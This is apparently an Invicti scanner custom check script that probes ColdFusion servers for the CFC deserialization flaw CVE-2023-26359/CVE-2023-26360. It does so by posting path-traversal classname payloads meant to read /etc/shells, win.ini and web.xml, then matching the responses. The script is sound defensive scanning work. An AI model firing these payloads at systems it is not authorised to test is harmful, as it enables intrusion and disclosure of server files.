/* 
*  This Passive Security Check script was generated by Invicti Standard 23.9.0.42095, at 9/11/2023 1:09:28 PM 
*  For more information about Custom Script Checks and samples, please refer to documentation: 
*  https://www.invicti.com/support/custom-security-checks-scripting/ 
*/ 

var attacks = [
    {
        id: '6812de89-d79d-494b-851f-acd49a5d0cda',
        name: 'ColdFusion CFC Deserialization RCE (CVE-2023-26359/CVE-2023-26360)'
    }
];

function analyze(context, response) {

    var url = response.Uri.toString();
    var attacks = ["/../../../../../../../../../../../etc/shells", "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini", "/WEB-INF/web.xml"]
    
    // Tests for CFC Deserialization RCE/LFR in the CFIDE endpoint (CVE-2023-26359/CVE-2023-26360)

    function isEtcShells (body){

        var re = /(\/bin\/sh|\/bin\/dash|\/bin\/bash|\/bin\/rbash|\/usr\/bin\/tmux|\/usr\/bin\/screen|\/usr\/bin\/sh|\/bin\/zsh|\/usr\/bin\/zsh|\/usr\/local\/bin\/sh|\/usr\/local\/bin\/bash|\/bin\/tcsh|\/usr\/bin\/tcsh|\/bin\/csh|\/bin\/rbash|\/sbin\/nologin|\/usr\/local\/bin\/zsh|\/usr\/local\/bin\/nologin|\/sbin\/sh|\/usr\/local\/bin\/zsh|\/usr\/local\/bin\/tcsh|\/usr\/local\/bin\/rbash|\/bin\/false)/;
        var result = body.match(re);
        if (result != null) {
            return true;
        } 
        return false;
    }

    function isWinIni (body){
        var re = /for 16-bit app support/;
        var result = body.match(re);
        if (result != null) {
            return true;
        }
        return false;
    }

    function isWebInf (body){
        var re = /<\/web-app>/;
        var result = body.match(re);
        if (result != null) {
            return true;
        }
        return false;
    }

    for (i=0; i<attacks.length ; i=i+1){
        var attack = attacks[i];
        var request = new Request(url + '/CFIDE/adminapi/administrator.cfc?method=testzxc&_cfclient=true&returnFormat=json');
        var body = '_variables={"_metadata":{"classname":"' + attack + '","_variables":[]}}';
        request.Body = body;
        request.Headers.Add('Content-Type','application/x-www-form-urlencoded');
        
        var response = invicti.request(request);
        body = response.Body;
            
        if ( (isEtcShells(body) || isWinIni(body) || isWebInf(body)) && response.StatusCode != 500) {
            return new Vulnerability("f58556a9-7f0b-4924-9a30-e4103901b82c");
        }

    }

    // End test of CFC Deserialization RCE/LFR in the CFIDE endpoint (CVE-2023-26359/CVE-2023-26360)

    // Tests for the Deserialization RCE/LFR in custom cfc-components (CVE-2023-26359/CVE-2023-26360)

    if (url.indexOf('.cfc') > -1 && url.indexOf('method=') > -1 && url.indexOf('cfcexplorer.cfc') == -1) {

        logUI('ColdFusion CFC Deserialization RCE (CVE-2023-26359/CVE-2023-26360) check started');

        var request = new Request(url + '&_cfclient=true&returnFormat=json');
        var body = '_variables={"_metadata":{"classname":"/../testinv207test","_variables":[]}}';
        request.Body = body;
        request.Headers.Add('Content-Type','application/x-www-form-urlencoded');
        
        var response = invicti.request(request);
        if (response.Body.indexOf('/../testinv207test') > -1 && response.StatusCode != 500) {
            return new Vulnerability("f58556a9-7f0b-4924-9a30-e4103901b82c");
        }

    } else {
        logUI('ColdFusion CFC Deserialization RCE (CVE-2023-26359/CVE-2023-26360) check skipped');
    }

    // End test of the Deserialization RCE/LFR in custom cfc-components (CVE-2023-26359/CVE-2023-26360)

}
